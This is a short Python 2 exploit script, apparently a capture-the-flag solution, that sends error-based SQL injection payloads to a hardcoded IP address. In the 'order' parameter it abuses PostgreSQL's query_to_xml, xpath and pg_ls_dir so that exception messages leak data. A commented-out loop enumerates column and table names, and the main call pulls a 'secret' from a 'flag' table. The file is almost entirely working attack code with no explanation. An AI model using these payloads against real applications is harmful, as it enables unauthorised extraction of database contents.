import urllib2
import urllib

url = "http://200.136.213.109/"

def r(param):
    global url
    try:
        req = urllib2.Request(url,param)
        res = urllib2.urlopen(req)
        return res.read()
    except urllib2.HTTPError, e:
        if e.getcode() == 500:
            return e.read()

def p(data):
    return data.split('PSQLException:')[1].split('&quot;')[1].split('&quot;')[0]

def main():
    # Extract table and column name
    #for i in range(0,30):
    #    print p(r("name=&age=&crime=&submit&order=array_upper(xpath ('row', query_to_xml ('select pg_ls_dir((SELECT column_name||chr(58)||table_name FROM information_schema.columns c limit 1 offset %d))', true,  false,'')),1)"%(i)))

    # Extract flag
    print p(r("name=&age=&crime=&submit&order=array_upper(xpath('row',query_to_xml('select pg_ls_dir((SELECT secret from flag))',true,false,'')),1)"))


if __name__=='__main__':
    main()
